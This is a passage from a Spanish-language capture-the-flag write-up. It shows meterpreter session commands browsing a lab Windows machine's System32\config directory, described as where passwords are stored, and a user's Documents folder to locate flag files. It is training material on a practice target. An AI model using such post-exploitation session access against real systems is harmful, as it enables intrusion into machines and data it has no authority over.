000000/---------  0      fif   1970-01-01 01:00:00 +0100  hiberfil.sys
000000/---------  0      fif   1970-01-01 01:00:00 +0100  pagefile.sys
```

### 2. Esta bandera se encuentra donde se suelen guardar las contraseñas en Windows

El lugar al que se refiere es al directorio config de System32, en este caso aparecen muchos más ficheros y esta escondida

```
meterpreter > cd ../../Windows/System32/config
meterpreter > ls
Listing: C:\Windows\System32\config
===================================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100666/rw-rw-rw-  34        fil   2019-03-17 20:32:48 +0100  flag2.txt
```

### 3. Esta bandera se encuentra donde los Administradores suelen tener cosas interesantes guardadas

El lugar al que se refiere es a los documentos, ya que ahí pueden llegar a tener información que solo quiere tener guardada en su máquina y en este caso es el directorio Documents del usuario Jon

```
meterpreter > cd ../../Users/Jon/Documents
meterpreter > ls
Listing: C:\Users\Jon\Documents
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2018-12-13 04:13:31 +0100  My Music
040777/rwxrwxrwx  0     dir   2018-12-13 04:13:31 +0100  My Pictures
040777/rwxrwxrwx  0     dir   2018-12-13 04:13:31 +0100  My Videos
100666/rw-rw-rw-  402   fil   2018-12-13 04:13:48 +0100  desktop.ini
100666/rw-rw-rw-  37    fil   2019-03-17 20:26:36 +0100  flag3.txt
```

